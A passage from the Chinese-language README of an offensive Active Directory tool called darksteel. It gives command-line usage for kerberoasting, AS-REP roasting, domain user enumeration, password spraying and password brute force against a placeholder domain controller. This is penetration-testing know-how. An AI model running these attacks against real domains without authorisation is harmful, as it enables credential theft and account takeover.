darksteel kerberos -dc 192.168.1.1 -ticket 123.kirbi -m kerberoast -tuser test
```

##### asreproast（支持密码为hash）

##### 利用所有用户并输出

```
darksteel kerberos -dc 192.168.1.1 -domain test.com -user administrator -pass 123 -m asreproast
```

##### 利用指定test用户并输出

```
darksteel kerberos -dc 192.168.1.1 -domain test.com  -m asreproast -tuser test
```
#### 可选择参数

```
-o                  保存文件（不包括自定义查询）

-ldapsizelimit      最大查询数（默认所有）

-enctype            选择加密方式（默认rc4）

-format             选择输出爆破格式（默认hashcat）
```

## blast

##### 域用户枚举

```
darksteel blast -m userenum -dc 192.168.1.1 -domain test.com -userfile user.txt
```
##### 密码喷洒

```
darksteel blast -m passspray -dc 192.168.1.1 -domain test.com -userfile user.txt -pass 123456
```

##### 单用户密码爆破

```
darksteel blast -m blastpass -dc 192.168.1.1 -domain test.com -user admin -passfile password.txt
```

##### 用户对应密码爆破（字典格式 admin:123456）

```
darksteel blast -m userpass -dc 192.168.1.1 -domain test.com -upfile userpassword.txt
```

#### 可选择参数
```
-v      输出失败信息

-t      线程设置（默认20）

-o      输出文件

blast时如果在域内使用则可以不指定dc。目前ldap查询不支持
```

# TODO 
```
1、持续添加其他利用方式

2、添加其他信息搜集内容

3、修改BUG
```

# Thank
https://github.com/jcmturner/gokrb5

https://github.com/go-ldap/ldap

https://github.com/ropnop/kerbrute
